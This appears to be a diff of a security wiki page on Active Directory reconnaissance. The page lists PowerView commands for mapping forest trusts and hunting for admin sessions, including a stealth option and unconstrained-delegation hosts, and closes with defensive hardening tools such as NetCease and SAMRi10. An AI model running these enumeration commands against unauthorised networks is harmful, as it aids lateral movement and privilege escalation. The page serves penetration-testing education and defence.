+<span style=color:#6272a4># Map trusts of a forest</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestTrust</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestTrust</span> -Forest lab.local
 
-# Map all trusts in current forest
-Get-NetForestDomain |  Get-NetDomainTrust
-</code></pre><h2 id=user-hunting>User Hunting <a href=#user-hunting class=anchor aria-hidden=true>#</a></h2><pre><code class=language-powershell># Find all machines on the current domain where the current user has local admin access
-# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.
-# Can also be done using WMI and PowerShell Remoting
-# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1
-Find-LocalAdminAccess -Verbose
+<span style=color:#6272a4># Map all trusts in current forest</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestDomain</span> |  <span style=color:#8be9fd;font-style:italic>Get-NetDomainTrust</span>
+</code></pre></div><h2 id=user-hunting>User Hunting <a href=#user-hunting class=anchor aria-hidden=true>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Find all machines on the current domain where the current user has local admin access</span>
+<span style=color:#6272a4># This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.</span>
+<span style=color:#6272a4># Can also be done using WMI and PowerShell Remoting</span>
+<span style=color:#6272a4># See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1</span>
+<span style=color:#8be9fd;font-style:italic>Find-LocalAdminAccess</span> -Verbose
 
-# Find local admins on all machines of the domain (needs administrator privs on non-dc machines).
-# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Get-NetLocalGroup on each machine.
-Invoke-EnumerateLocalAdmin -Verbose
+<span style=color:#6272a4># Find local admins on all machines of the domain (needs administrator privs on non-dc machines).</span>
+<span style=color:#6272a4># This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Get-NetLocalGroup on each machine.</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-EnumerateLocalAdmin</span> -Verbose
 
-# Find computers where a domain admin (or specified user/group) has sessions
-# This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list of computers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession/Get-NetLoggedon ) from each
-Invoke-UserHunter
-Invoke-UserHunter -GroupName &quot;RDPUsers&quot;
+<span style=color:#6272a4># Find computers where a domain admin (or specified user/group) has sessions</span>
+<span style=color:#6272a4># This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list of computers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession/Get-NetLoggedon ) from each</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-UserHunter</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-UserHunter</span> -GroupName <span style=color:#f1fa8c>&#34;RDPUsers&#34;</span>
 
-# To confirm admin access
-Invoke-UserHunter -CheckAccess
+<span style=color:#6272a4># To confirm admin access</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-UserHunter</span> -CheckAccess
 
-# Find computers where a domain admin is logged-in.
-# This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.
-Invoke-UserHunter -Stealth
+<span style=color:#6272a4># Find computers where a domain admin is logged-in.</span>
+<span style=color:#6272a4># This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-UserHunter</span> -Stealth
 
-# Find-DomainUserLocation == old Invoke-UserHunter
-# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
-Find-DomainUserLocation -ComputerUnconstrained -ShowAll
+<span style=color:#6272a4># Find-DomainUserLocation == old Invoke-UserHunter</span>
+<span style=color:#6272a4># enumerate servers that allow unconstrained Kerberos delegation and show all users logged in</span>
+<span style=color:#8be9fd;font-style:italic>Find-DomainUserLocation</span> -ComputerUnconstrained -ShowAll
 
-# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
-Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
-</code></pre><h3 id=defending-against-user-hunting>Defending against User Hunting <a href=#defending-against-user-hunting class=anchor aria-hidden=true>#</a></h3><h4 id=netcease>NetCease <a href=#netcease class=anchor aria-hidden=true>#</a></h4><ul><li>Script to change permissions on <code>NetSessionEnum</code> method by removing permissions for <code>Authenticated Users</code> group</li><li>Fails many of the attacker&rsquo;s session enumeration and hence user hunting capabilities</li></ul><pre><code class=language-powershell>.\NetCease.ps1
-</code></pre><h4 id=samri10>SAMRi10 <a href=#samri10 class=anchor aria-hidden=true>#</a></h4><ul><li>From same author as NetCease</li><li>Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)</li><li>https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b</li></ul><div class="docs-navigation d-flex justify-content-between"><a href=/active_directory/trust_attacks/mssql_servers/><div class="card my-1"><div class="card-body py-2">&larr; MS-SQL Servers</div></div></a><a class=ms-auto href=/active_directory/mitm_relay/smb_relay/><div class="card my-1"><div class="card-body py-2">SMB Relay &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item></li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline></ul></div></div></div></footer><script src=/js/bootstrap.min.592b9faf6c83a2bda564a377cf82f9a67546b198510a93fdb0728f9622ec22729d44be02fb2ea16c3fe5365ae1806259cd111932ca28e68b66462d6937635bab.js integrity="sha512-WSufr2yDor2lZKN3z4L5pnVGsZhRCpP9sHKPliLsInKdRL4C+y6hbD/lNlrhgGJZzREZMsoo5otmRi1pN2Nbqw==" crossorigin=anonymous defer></script>
+<span style=color:#6272a4># hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation</span>
+<span style=color:#8be9fd;font-style:italic>Find-DomainUserLocation</span> -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
+</code></pre></div><h3 id=defending-against-user-hunting>Defending against User Hunting <a href=#defending-against-user-hunting class=anchor aria-hidden=true>#</a></h3><h4 id=netcease>NetCease <a href=#netcease class=anchor aria-hidden=true>#</a></h4><ul><li>Script to change permissions on <code>NetSessionEnum</code> method by removing permissions for <code>Authenticated Users</code> group</li><li>Fails many of the attacker&rsquo;s session enumeration and hence user hunting capabilities</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>.\NetCease.ps1
+</code></pre></div><h4 id=samri10>SAMRi10 <a href=#samri10 class=anchor aria-hidden=true>#</a></h4><ul><li>From same author as NetCease</li><li>Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)</li><li>https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b</li></ul><div class="docs-navigation d-flex justify-content-between"><a href=/active_directory/trust_attacks/mssql_servers/><div class="card my-1"><div class="card-body py-2">&larr; MS-SQL Servers</div></div></a><a class=ms-auto href=/active_directory/mitm_relay/smb_relay/><div class="card my-1"><div class="card-body py-2">SMB Relay &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item></li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline></ul></div></div></div></footer><script src=/js/bootstrap.min.592b9faf6c83a2bda564a377cf82f9a67546b198510a93fdb0728f9622ec22729d44be02fb2ea16c3fe5365ae1806259cd111932ca28e68b66462d6937635bab.js integrity="sha512-WSufr2yDor2lZKN3z4L5pnVGsZhRCpP9sHKPliLsInKdRL4C+y6hbD/lNlrhgGJZzREZMsoo5otmRi1pN2Nbqw==" crossorigin=anonymous defer></script>
 <script src=/js/highlight.min.e13cfba4c5524e30386cb9ea71f0f191f39d15b25b222f4b67549689f7c076158f42a2282446044f5cdacc76a6d003efbfa252a84aea0116703803b6339ae35f.js integrity="sha512-4Tz7pMVSTjA4bLnqcfDxkfOdFbJbIi9LZ1SWiffAdhWPQqIoJEYET1zazHam0APvv6JSqErqARZwOAO2M5rjXw==" crossorigin=anonymous defer></script>
 <script src=/main.min.bfb6b781dd5fd7177a7a9b3ce0bd84f12db95f6aa4e3fc7b339cd57879c38390d1e8d75cf314836a71201ba2fd6a2e26084a956704964c0bb884c26e9eff5ee1.js integrity="sha512-v7a3gd1f1xd6eps84L2E8S25X2qk4/x7M5zVeHnDg5DR6Ndc8xSDanEgG6L9ai4mCEqVZwSWTAu4hMJunv9e4Q==" crossorigin=anonymous defer></script>
-<script src=https://wiki.bufu-sec.com/index.min.224702c1ce809186fcf5b062bb2cf882099ae035049fac44a83c906990cb3e1234fb14f82243d36ee1804ed9ac6751e6d2f07b89b44b550373f594821df2c45b.js integrity="sha512-IkcCwc6AkYb89bBiuyz4ggma4DUEn6xEqDyQaZDLPhI0+xT4IkPTbuGATtmsZ1Hm0vB7ibRLVQNz9ZSCHfLEWw==" crossorigin=anonymous defer></script></body></html>
+<script src=https://wiki.bufu-sec.com/index.min.c55f22f03cfa2cd138ac2b4b1f7286662f7b15f65463d48de9bd3c016c6d3c931fbd8ab2bd461be74c468ddd1bec697aa69a62adb5af4b7f23a9a1db39019d2f.js integrity="sha512-xV8i8Dz6LNE4rCtLH3KGZi97FfZUY9SN6b08AWxtPJMfvYqyvUYb50xGjd0b7Gl6pppirbWvS38jqaHbOQGdLw==" crossorigin=anonymous defer></script></body></html>
